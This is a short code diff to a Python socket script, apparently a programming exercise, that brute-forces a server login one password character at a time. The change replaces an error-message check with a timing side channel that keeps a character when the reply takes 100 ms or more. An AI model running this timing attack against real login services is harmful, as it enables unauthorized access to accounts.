@@ -3,6 +3,7 @@ import socket
 import itertools
 import string
 import json
+import datetime
 
 
 def main():
@@ -30,8 +31,10 @@ def main():
             while True:
                 ch = next(alphabet)
                 client_socket.send(login_password_to_json(login, password + ch).encode())
+                start_time = datetime.datetime.now()
                 result = get_result_from_server(client_socket)
-                if result == 'Exception happened during login':
+                end_time = datetime.datetime.now()
+                if (end_time - start_time).microseconds >= 100000:
                     password += ch
                     alphabet = alphabet_for_password()
                 if result == 'Connection success!':
